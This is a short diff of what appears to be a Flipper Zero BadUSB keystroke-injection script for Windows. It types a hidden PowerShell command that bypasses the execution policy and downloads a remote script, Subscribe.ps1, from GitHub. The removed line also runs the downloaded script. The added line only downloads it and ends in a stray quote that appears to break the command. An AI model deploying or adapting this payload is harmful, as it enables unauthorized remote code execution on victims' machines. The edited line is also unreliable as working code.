@@ -8,5 +8,5 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass -Command "& { Invoke-WebRequest https://raw.githubusercontent.com/itsweekly/FlipperZero-Bad-Polar/main/Subscribe/Subscribe.ps1 -OutFile C:\Users\$env:USERNAME\Downloads\Subscribe.ps1; & 'C:\Users\$env:USERNAME\Downloads\Subscribe.ps1' }"
+STRING powershell -w h -NoP -Ep Bypass -Command "& { Invoke-WebRequest https://raw.githubusercontent.com/itsweekly/FlipperZero-Bad-Polar/main/Subscribe/Subscribe.ps1 -OutFile C:\Users\$env:USERNAME\Downloads\Subscribe.ps1 -Verbose' }"
 ENTER
